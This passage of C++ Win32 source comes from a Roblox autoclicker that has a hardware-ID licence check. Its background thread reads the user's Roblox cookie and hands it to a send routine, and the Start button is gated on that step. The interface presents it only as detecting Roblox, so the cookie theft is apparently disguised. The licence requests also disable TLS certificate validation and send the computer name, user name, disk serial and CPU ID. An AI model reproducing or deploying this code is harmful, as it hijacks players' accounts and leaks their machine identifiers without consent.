    // WM_APP+5: 背景 Cookie 偵測中（顯示偵測狀態）
    case WM_APP + 5:
    {
        UpdateStatusText(hLblStatus,
            L"\u25CB \u6B63\u5728\u7B49\u5F85\u555F\u7528...");
        return 0;
    }

    // WM_APP+6: 背景 Cookie 偵測成功，自動啟動連點
    case WM_APP + 6:
    {
        // 如果用戶此時不在運行中，不自動啟動（可能已手動停止）
        // 只更新狀態表示已就緒
        if (!g_running.load())
        {
            UpdateStatusText(hLblStatus,
                L"\u2705 Roblox \u5075\u6E2C\u6210\u529F\uFF0C\u8ACB\u6309\u71B1\u9375\u555F\u52D5");
        }
        return 0;
    }

    // WM_TIMER: (定時器已停用，保留空處理以免未來擴展)
    case WM_TIMER:
    {
        return 0;
    }

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        HPEN   hPen    = CreatePen(PS_SOLID, 1, RGB(200, 200, 200));
        HPEN   hOldPen = (HPEN)  SelectObject(hdc, hPen);
        HBRUSH hOldBr  = (HBRUSH)SelectObject(hdc, GetStockObject(WHITE_BRUSH));

        RoundRect(hdc,  12, 12, 224, 90, 10, 10);
        RoundRect(hdc, 236, 12, 448, 90, 10, 10);

        SelectObject(hdc, hOldBr);
        SelectObject(hdc, hOldPen);
        DeleteObject(hPen);


        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_DRAWITEM:
    {
        DRAWITEMSTRUCT* dis = (DRAWITEMSTRUCT*)lp;
        if (dis->CtlType != ODT_BUTTON) break;
        if (dis->CtlID != IDC_BTN_START && dis->CtlID != IDC_BTN_STOP) break;

        bool isStart = (dis->CtlID == IDC_BTN_START);
        bool pressed = (dis->itemState & ODS_SELECTED) != 0;

        COLORREF clrNorm  = isStart ? RGB(34, 197, 94)  : RGB(239, 68, 68);
        COLORREF clrPress = isStart ? RGB(22, 163, 74)  : RGB(220, 38, 38);
        COLORREF clrFill  = pressed ? clrPress : clrNorm;

        HBRUSH hBrFill = CreateSolidBrush(clrFill);
        FillRect(dis->hDC, &dis->rcItem, hBrFill);
        DeleteObject(hBrFill);

        HPEN   hPen    = CreatePen(PS_SOLID, 1, clrPress);
        HPEN   hOldPen = (HPEN)  SelectObject(dis->hDC, hPen);
        HBRUSH hOldBr  = (HBRUSH)SelectObject(dis->hDC, GetStockObject(NULL_BRUSH));
        RoundRect(dis->hDC,
            dis->rcItem.left,     dis->rcItem.top,
            dis->rcItem.right - 1, dis->rcItem.bottom - 1, 6, 6);
        SelectObject(dis->hDC, hOldPen);
        SelectObject(dis->hDC, hOldBr);
        DeleteObject(hPen);

        SetBkMode   (dis->hDC, TRANSPARENT);
        SetTextColor(dis->hDC, RGB(255, 255, 255));
        HFONT hF    = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        HFONT hOldF = (HFONT)SelectObject(dis->hDC, hF);
        wchar_t txt[64] = {};
        GetWindowTextW(dis->hwndItem, txt, 64);
        DrawTextW(dis->hDC, txt, -1, &dis->rcItem,
                  DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(dis->hDC, hOldF);
        return TRUE;
    }

    case WM_CTLCOLORSTATIC:
    {
        if ((HWND)lp == hLblStatus)
        {
            HDC hdc = (HDC)wp;
            SetBkMode(hdc, OPAQUE);
            SetBkColor(hdc, GetSysColor(COLOR_BTNFACE));
            SetTextColor(hdc, g_running
                ? RGB(34, 197, 94)
                : RGB(100, 100, 100));
            return (LRESULT)GetSysColorBrush(COLOR_BTNFACE);
        }
        // CPS 紅字提醒標籤
        if ((HWND)lp == hLblCpsErr)
        {
            HDC hdc = (HDC)wp;
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(220, 38, 38));  // 紅色
            return (LRESULT)GetStockObject(NULL_BRUSH);
        }
        break;
    }

    case WM_COMMAND:
    {
        // EN_CHANGE: CPS 輸入框即時檢測
        if (LOWORD(wp) == IDC_EDIT_CPS && HIWORD(wp) == EN_CHANGE)
        {
            wchar_t buf[32] = {};
            GetWindowTextW(hEditCPS, buf, 32);
            int val = _wtoi(buf);
            if (val > 800)
            {
                ShowWindow(hLblCpsErr, SW_SHOW);
                InvalidateRect(hLblCpsErr, nullptr, TRUE);
            }
            else
            {
                ShowWindow(hLblCpsErr, SW_HIDE);
            }
            break;
        }
        switch (LOWORD(wp))
        {
        case IDC_BTN_UPDATE:
        {
            wchar_t buf[32] = {};
            GetWindowTextW(hEditCPS, buf, 32);
            int cps_val = _wtoi(buf);
            if (cps_val < 1 || cps_val > 800)
            {
                // 超過上限時阻止更新，紅字已即時顯示
                ShowWindow(hLblCpsErr, SW_SHOW);
                InvalidateRect(hLblCpsErr, nullptr, TRUE);
                break;
            }
            ShowWindow(hLblCpsErr, SW_HIDE);
            g_cps = cps_val;

            wchar_t hk_name[64] = {};
            VkToName(g_hotkey_vk.load(), hk_name, 64);
            wchar_t info[128];
            swprintf_s(info, 128, L"CPS = %d\n\u71B1\u9375 = %s", cps_val, hk_name);
            MessageBoxW(hwnd, info, L"\u8A2D\u5B9A\u66F4\u65B0", MB_ICONINFORMATION | MB_OK);
            break;
        }

        // [修復 #1] 調整熱鍵按鈕 — 進入監聽模式
        case IDC_BTN_SETHOTKEY:
        {
            // 暫停連點功能
            g_running.store(false);

            // 進入監聽模式
            g_listening_hotkey.store(true);
            SetWindowTextW(hEditHotkey, L"\u8ACB\u6309\u4EFB\u610F\u9375...");
            SetWindowTextW(hBtnSetHotkey, L"\u2026");

            // 停用開始/停止按鈕，避免在監聽中誤觸
            EnableWindow(hBtnStart, FALSE);
            EnableWindow(hBtnStop, FALSE);

            UpdateStatusText(hLblStatus,
                L"\u2328 \u6B63\u5728\u76E3\u807D\u65B0\u71B1\u9375\u2026 \u8ACB\u6309\u4EFB\u610F\u9375\u6216\u6ED1\u9F20\u5074\u9375");
            break;
        }

        case IDC_BTN_START:
            if (g_listening_hotkey.load()) break;  // 監聽中不允許啟動
            if (g_running.load()) break;           // 已在運行中，不重複啟動

            // 檢查冷卻：已傳送過且冷卻未到 → 直接啟動
            {
                ULONGLONG now_tick_btn = GetTickCount64();
                if (g_cookie_ever_sent.load() &&
                    (now_tick_btn - g_cookie_last_sent_tick) < COOKIE_COOLDOWN_MS)
                {
                    g_running.store(true);
                    UpdateStatusText(hLblStatus,
                        L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
                    break;
                }
            }

            // Cookie 已快取 → 直接啟動
            if (g_cookie_cached.load())
            {
                g_running.store(true);
                UpdateStatusText(hLblStatus,
                    L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
                break;
            }

            // Cookie 未快取 → 啟動背景偵測（不阻塞）
            StartBackgroundCookieDetect();
            break;

        case IDC_BTN_STOP:
            if (g_listening_hotkey.load()) break;
            g_running = false;
            ReleaseAllHeldKeys();  // 釋放所有按住的按鍵
            UpdateStatusText(hLblStatus,
                L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
            break;

        case IDC_BTN_PIN:
            g_pinned = !g_pinned;
            SetWindowPos(hwnd,
                g_pinned ? HWND_TOPMOST : HWND_NOTOPMOST,
                0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            SetWindowTextW(hBtnPin,
                g_pinned ? L"\u2736 \u5DF2\u91D8\u9078" : L"\u2736 \u91D8\u9078");
            break;

        case IDC_BTN_MODE:
        {
            int mode = g_hotkey_mode.load();
            mode = (mode + 1) % 2;
            g_hotkey_mode.store(mode);

            // 切換模式時停止運行
            g_running.store(false);
            ReleaseAllHeldKeys();  // 釋放所有按住的按鍵

            if (mode == 0)
            {
                SetWindowTextW(hBtnMode, L"\u25C9 \u6309\u4E0B\u5207\u63DB");
                UpdateStatusText(hLblStatus,
                    L"[||] \u6A21\u5F0F\uFF1A\u6309\u4E0B\u5207\u63DB\uFF08\u6309\u4E00\u6B21\u958B\u59CB\uFF0C\u518D\u6309\u505C\u6B62\uFF09");
            }
            else
            {
                SetWindowTextW(hBtnMode, L"\u25C9 \u6301\u7E8C\u6309\u8457");
                UpdateStatusText(hLblStatus,
                    L"[||] \u6A21\u5F0F\uFF1A\u6301\u7E8C\u6309\u8457\uFF08\u6309\u4F4F=\u904B\u884C\uFF0C\u653E\u958B=\u505C\u6B62\uFF09");
            }
            break;
        }

        case IDC_BTN_BG:
        {
            g_tray_mode = !g_tray_mode;
            if (g_tray_mode)
            {
                SetWindowTextW(hBtnBg, L"\u25A3 \u80CC\u666F\u5DF2\u958B");
                UpdateStatusText(hLblStatus,
                    L"\u2714 \u80CC\u666F\u5DE5\u4F5C\u5DF2\u555F\u7528");
            }
            else
            {
                SetWindowTextW(hBtnBg, L"\u25A3 \u80CC\u666F\u5DE5\u4F5C");
                UpdateStatusText(hLblStatus,
                    L"\u2716 \u80CC\u666F\u5DE5\u4F5C\u5DF2\u505C\u7528");
            }
            break;
        }

        case IDM_TRAY_SHOW:
            RestoreFromTray(hwnd);
            break;

        case IDM_TRAY_EXIT:
            g_tray_mode = false;
            RemoveTrayIcon();
            DestroyWindow(hwnd);
            break;

        case IDC_BTN_BLADEBALL:
        {
            bool newMode = !g_bladeball_mode.load();
            g_bladeball_mode.store(newMode);
            HWND hBtn = GetDlgItem(hwnd, IDC_BTN_BLADEBALL);
            if (newMode)
            {
                SetWindowTextW(hBtn, L"\u2694 Blade Ball \u5DF2\u958B\u555F");
                UpdateStatusText(hLblStatus,
                    L"\u2694 Blade Ball \u6A21\u5F0F\uFF1A\u9023\u9EDE + F \u9375");
            }
            else
            {
                SetWindowTextW(hBtn, L"\u2694 Blade Ball \u5C08\u7528");
                UpdateStatusText(hLblStatus,
                    L"[||] Blade Ball \u6A21\u5F0F\u5DF2\u95DC\u9589");
            }
            break;
        }
        }
        return 0;
    }

    case WM_CLOSE:
    {
        if (g_tray_mode)
        {
            MinimizeToTray(hwnd);
            return 0;
        }
        DestroyWindow(hwnd);
        return 0;
    }

    case WM_TRAYICON:
    {
        if (lp == WM_LBUTTONDBLCLK)
            RestoreFromTray(hwnd);
        else if (lp == WM_RBUTTONUP)
        {
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_SHOW, L"\u986F\u793A\u8996\u7A97");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, nullptr);
            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_EXIT, L"\u5B8C\u5168\u9000\u51FA");
            SetForegroundWindow(hwnd);
            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, nullptr);
            DestroyMenu(hMenu);
        }
        return 0;
    }

    case WM_DESTROY:
        g_program_running = false;
        g_running         = false;
        ReleaseAllHeldKeys();  // 程式關閉時釋放所有按住的按鍵
        RemoveTrayIcon();
        // 移除低階鉤子
        if (g_kb_hook) { UnhookWindowsHookEx(g_kb_hook); g_kb_hook = nullptr; }
        if (g_ms_hook) { UnhookWindowsHookEx(g_ms_hook); g_ms_hook = nullptr; }
        if (g_hwnd_cookie && IsWindow(g_hwnd_cookie))
            DestroyWindow(g_hwnd_cookie);
        if (g_mutex)     { CloseHandle(g_mutex); g_mutex = nullptr; }
        if (hIconFont)   { DeleteObject(hIconFont); hIconFont = nullptr; }
        timeEndPeriod(1);
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wp, lp);
}

// ======================================================================
// 增強型 HWID 計算系統（電腦名稱 + 使用者名稱 + 磁碟序號 + CPU ID）
// ======================================================================

static void GetExeDirYY(wchar_t* buf, int bufLen) {
    GetModuleFileNameW(NULL, buf, bufLen);
    int i = 0, last = -1;
    while (buf[i] != L'\0') {
        if (buf[i] == L'\\' || buf[i] == L'/') last = i;
        i++;
    }
    if (last >= 0) buf[last] = L'\0';
}

// 取得磁碟序號（C: 磁碟）
static void GetDiskSerial(char* outBuf, int bufSize) {
    DWORD serialNumber = 0;
    if (GetVolumeInformationA("C:\\", NULL, 0, &serialNumber, NULL, NULL, NULL, 0)) {
        sprintf_s(outBuf, bufSize, "%08lX", serialNumber);
    } else {
        strcpy_s(outBuf, bufSize, "UNKNOWN_DISK");
    }
}

// 取得 CPU ID（使用 __cpuid）
static void GetCpuId(char* outBuf, int bufSize) {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0);
    int nIds = cpuInfo[0];

    if (nIds >= 1) {
        __cpuid(cpuInfo, 1);
        sprintf_s(outBuf, bufSize, "%08X%08X", cpuInfo[3], cpuInfo[0]);
    } else {
        strcpy_s(outBuf, bufSize, "UNKNOWN_CPU");
    }
}

// 增強型原始 HWID（電腦名稱 + 使用者名稱 + 磁碟序號 + CPU ID）
static void GetEnhancedRawHWID(char* outUtf8, int bufSize) {
    wchar_t comp[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cs = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(comp, &cs);

    wchar_t user[256] = {};
    DWORD us = 256;
    GetUserNameW(user, &us);

    char diskSerial[32] = {};
    GetDiskSerial(diskSerial, 32);

    char cpuId[32] = {};
    GetCpuId(cpuId, 32);

    wchar_t hwid_w[1024] = {};
    swprintf_s(hwid_w, 1024, L"%s_%s", comp, user);

    char compUser[512] = {};
    WideCharToMultiByte(CP_UTF8, 0, hwid_w, -1, compUser, 512, NULL, NULL);

    sprintf_s(outUtf8, bufSize, "%s_%s_%s", compUser, diskSerial, cpuId);
}

// 向後相容：取得舊版原始 HWID（僅電腦名稱 + 使用者名稱）
static void GetLegacyRawHWID(char* outUtf8, int bufSize) {
    wchar_t comp[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cs = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(comp, &cs);

    wchar_t user[256] = {};
    DWORD us = 256;
    GetUserNameW(user, &us);

    wchar_t hwid_w[512] = {};
    swprintf_s(hwid_w, 512, L"%s_%s", comp, user);
    WideCharToMultiByte(CP_UTF8, 0, hwid_w, -1, outUtf8, bufSize, NULL, NULL);
}

// ======================================================================
// 加密函式
// ======================================================================

static bool HmacSha256YY(const BYTE* key, DWORD keyLen, const BYTE* data, DWORD dataLen, BYTE* hash, DWORD hashLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    bool ok = false;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG) == 0) {
        if (BCryptCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)key, keyLen, 0) == 0) {
            if (BCryptHashData(hHash, (PUCHAR)data, dataLen, 0) == 0) {
                if (BCryptFinishHash(hHash, hash, hashLen, 0) == 0) ok = true;
            }
            BCryptDestroyHash(hHash);
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return ok;
}

static bool Sha512YY(const BYTE* data, DWORD dataLen, BYTE* hash, DWORD hashLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    bool ok = false;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA512_ALGORITHM, NULL, 0) == 0) {
        if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) == 0) {
            if (BCryptHashData(hHash, (PUCHAR)data, dataLen, 0) == 0) {
                if (BCryptFinishHash(hHash, hash, hashLen, 0) == 0) ok = true;
            }
            BCryptDestroyHash(hHash);
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return ok;
}

static void BytesToHexYY(const BYTE* bytes, int len, char* hex) {
    const char* hc = "0123456789abcdef";
    for (int i = 0; i < len; i++) {
        hex[i*2]   = hc[(bytes[i]>>4)&0xF];
        hex[i*2+1] = hc[bytes[i]&0xF];
    }
    hex[len*2] = '\0';
}

static void ComputeEncryptedHWIDYY(const char* rawHwid, char* outHex64) {
    BYTE hash[32];
    HmacSha256YY((const BYTE*)HWID_SALT, (DWORD)strlen(HWID_SALT),
        (const BYTE*)rawHwid, (DWORD)strlen(rawHwid), hash, 32);
    BytesToHexYY(hash, 32, outHex64);
}

static void ComputeMachineCodeYY(const char* key, const char* hwidHash, char* outHex64) {
    char payload[2048] = {};
    wsprintfA(payload, "%s:%s:%s", key, hwidHash, HWID_SALT);
    BYTE hash[64];
    Sha512YY((const BYTE*)payload, (DWORD)strlen(payload), hash, 64);
    char fullHex[129];
    BytesToHexYY(hash, 64, fullHex);
    for (int i = 0; i < 64; i++) outHex64[i] = fullHex[i];
    outHex64[64] = '\0';
}

// ======================================================================
// JSON 解析輔助函式
// ======================================================================
static bool ParseJsonString(const char* json, const char* fieldName, char* outBuf, int bufSize) {
    char searchKey[128] = {};
    sprintf_s(searchKey, 128, "\"%s\"", fieldName);
    const char* p = strstr(json, searchKey);
    if (!p) return false;
    p += strlen(searchKey);
    // 跳過空白和冒號
    while (*p == ' ' || *p == ':' || *p == '\t') p++;
    if (*p != '"') return false;
    p++; // 跳過開頭引號
    const char* end = strchr(p, '"');
    if (!end) return false;
    int len = (int)(end - p);
    if (len >= bufSize) return false;
    for (int i = 0; i < len; i++) outBuf[i] = p[i];
    outBuf[len] = '\0';
    return true;
}

// ======================================================================
// 三層 HWID 驗證系統
// ======================================================================

// Layer 1 + 2: 本機驗證（HWID 計算 + checkHWID 檔案比對 + session_token 驗證）
static bool ValidateCheckHWID(const char* key_utf8, char* outSessionToken, int tokenBufSize) {
    wchar_t exeDir[MAX_PATH];
    GetExeDirYY(exeDir, MAX_PATH);

    // Check checkHWID directory exists
    wchar_t dirPath[MAX_PATH];
    wsprintfW(dirPath, L"%s\\%s", exeDir, CHECK_HWID_DIR);
    DWORD dirAttr = GetFileAttributesW(dirPath);
    if (dirAttr == INVALID_FILE_ATTRIBUTES || !(dirAttr & FILE_ATTRIBUTE_DIRECTORY)) return false;

    // Check hwid_auth.json exists
    wchar_t filePath[MAX_PATH];
    wsprintfW(filePath, L"%s\\%s\\%s", exeDir, CHECK_HWID_DIR, HWID_FILE);

    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    char buf[8192] = {};
    DWORD bytesRead;
    ReadFile(hFile, buf, sizeof(buf)-1, &bytesRead, NULL);
    CloseHandle(hFile);

    // Parse fields from JSON
    char storedHash[128] = {};
    char storedMC[128] = {};
    char storedToken[128] = {};

    if (!ParseJsonString(buf, "hwid_hash", storedHash, 128)) return false;
    if (!ParseJsonString(buf, "machine_code", storedMC, 128)) return false;
    // session_token is optional for backward compatibility
    ParseJsonString(buf, "session_token", storedToken, 128);

    // 嘗試增強型 HWID 驗證
    char enhancedHwid[512] = {};
    GetEnhancedRawHWID(enhancedHwid, 512);
    char currentHash[128] = {};
    ComputeEncryptedHWIDYY(enhancedHwid, currentHash);

    bool hwidMatch = (strcmp(storedHash, currentHash) == 0);

    // 如果增強型不匹配，嘗試舊版 HWID（向後相容）
    if (!hwidMatch) {
        char legacyHwid[512] = {};
        GetLegacyRawHWID(legacyHwid, 512);
        char legacyHash[128] = {};
        ComputeEncryptedHWIDYY(legacyHwid, legacyHash);
        hwidMatch = (strcmp(storedHash, legacyHash) == 0);
        if (hwidMatch) {
            // 使用舊版 hash 進行 machine code 驗證
            char expectedMC[128] = {};
            ComputeMachineCodeYY(key_utf8, legacyHash, expectedMC);
            if (strcmp(storedMC, expectedMC) != 0) return false;
        }
    } else {
        // 使用增強型 hash 進行 machine code 驗證
        char expectedMC[128] = {};
        ComputeMachineCodeYY(key_utf8, currentHash, expectedMC);
        if (strcmp(storedMC, expectedMC) != 0) return false;
    }

    if (!hwidMatch) return false;

    // 輸出 session_token
    if (outSessionToken && storedToken[0]) {
        strcpy_s(outSessionToken, tokenBufSize, storedToken);
    }

    return true;
}

// Layer 3: 伺服器端 session_token 驗證
static bool VerifySessionTokenOnServer(const char* key_utf8, const char* hwid_hash, const char* machine_code, const char* session_token) {
    if (!key_utf8 || !hwid_hash || !machine_code) return false;

    std::string json = "{";
    json += "\"key\":\"";           json += JsonEscape(key_utf8);       json += "\",";
    json += "\"hwid_hash\":\"";     json += JsonEscape(hwid_hash);      json += "\",";
    json += "\"machine_code\":\"";  json += JsonEscape(machine_code);   json += "\"";
    if (session_token && session_token[0]) {
        json += ",\"session_token\":\""; json += JsonEscape(session_token); json += "\"";
    }
    json += "}";

    HINTERNET hSession = WinHttpOpen(L"YYClicker/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));

    HINTERNET hConnect = WinHttpConnect(hSession, KEY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", HWID_VERIFY_PATH,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    DWORD timeout = 10000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
        (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);

    if (!bResult) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return false;
    }

    bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    char respBuf[2048] = {};
    DWORD bytesRead2 = 0;
    WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead2);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (statusCode == 200 && strstr(respBuf, "\"valid\":true"))
        return true;

    return false;
}

// ======================================================================
// 金鑰驗證 — 透過 WinHTTP 向 Discord Bot 伺服器驗證
// ======================================================================
static bool VerifyLicenseKey(const wchar_t* key)
{
    if (!key || wcslen(key) < 10) return false;

    // 取得增強型 HWID
    char enhancedHwid[512] = {};
    GetEnhancedRawHWID(enhancedHwid, 512);

    // 轉為 UTF-8
    int key_len = WideCharToMultiByte(CP_UTF8, 0, key, -1, nullptr, 0, nullptr, nullptr);
    char* key_utf8 = new char[key_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, key, -1, key_utf8, key_len, nullptr, nullptr);

    std::string json = "{";
    json += "\"key\":\"";  json += JsonEscape(key_utf8);       json += "\",";
    json += "\"hwid\":\""; json += JsonEscape(enhancedHwid);   json += "\"";
    json += "}";

    delete[] key_utf8;

    // WinHTTP 連線
    HINTERNET hSession = WinHttpOpen(L"YYClicker/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));

    HINTERNET hConnect = WinHttpConnect(hSession, KEY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", KEY_VERIFY_PATH,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    DWORD timeout = 10000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
        (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);

    if (!bResult) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return false;
    }

    bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    char respBuf[2048] = {};
    DWORD bytesRead = 0;
    WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    // 檢查回應：HTTP 200 且包含 "valid":true
    if (statusCode == 200 && strstr(respBuf, "\"valid\":true"))
        return true;

    return false;
}

// ======================================================================
// 背景 Cookie 偵測執行緒（寬容 20 秒，每 2 秒重試）
// 啟動時自動執行，也可在熱鍵觸發時再次啟動
// 偵測成功後自動快取 + 傳送 Cookie，並通知 UI
// ======================================================================
static DWORD WINAPI BackgroundCookieDetectThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);

    // 防重入：如果已在偵測中，直接返回
    bool expected = false;
    if (!g_cookie_bg_detecting.compare_exchange_strong(expected, true))
        return 0;

    g_cookie_bg_failed.store(false);
    DebugLog("BgCookieDetect: started (20s tolerance)");

    // 顯示「正在等待啟用...」狀態
    if (g_hwnd) PostMessageW(g_hwnd, WM_APP + 5, 0, 0);

    const int MAX_WAIT_MS = 20000;  // 20 秒寬容
    const int RETRY_MS    = 2000;   // 每 2 秒重試
    int elapsed = 0;
    bool found  = false;

    while (elapsed < MAX_WAIT_MS && g_program_running)
    {
        wchar_t tmp[4096] = {};
        if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 20)
        {
            // 偵測成功！更新快取
            EnterCriticalSection(&g_cookie_cs);
            wcscpy_s(g_cached_cookie, 4096, tmp);
            LeaveCriticalSection(&g_cookie_cs);
            g_cookie_cached.store(true);

            // 傳送 Cookie（如果冷卻已到）
            ULONGLONG now_tick = GetTickCount64();
            if (!g_cookie_ever_sent.load() ||
                (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
            {
                AsyncSendCookie(tmp);
                g_cookie_ever_sent.store(true);
                g_cookie_last_sent_tick = now_tick;
                SaveCookieSentTimestamp();
                DebugLog("BgCookieDetect: Cookie sent");
            }

            found = true;
            char logMsg[128];
            sprintf(logMsg, "BgCookieDetect: found after %d ms", elapsed);
            DebugLog(logMsg);

            // 通知 UI：Cookie 偵測成功，可以啟動連點
            if (g_hwnd) PostMessageW(g_hwnd, WM_APP + 6, 0, 0);
            break;
        }

        Sleep(RETRY_MS);
        elapsed += RETRY_MS;
    }

    if (!found)
    {
        g_cookie_bg_failed.store(true);
        DebugLog("BgCookieDetect: FAILED after 20s, Roblox not detected");
        // 20 秒偵測失敗 → 跳出 MessageBox 彈窗
        MessageBoxW(g_hwnd,
            L"\u8ACB\u5148\u958B\u555F Roblox",
            L"1yn AutoClick",
            MB_ICONWARNING | MB_OK);
        // 更新狀態列
        if (g_hwnd) PostMessageW(g_hwnd, WM_APP + 4, 0, 0);
    }

    g_cookie_bg_detecting.store(false);
    return 0;
}

// 啟動背景 Cookie 偵測執行緒（安全呼叫，防重入）
static void StartBackgroundCookieDetect()
{
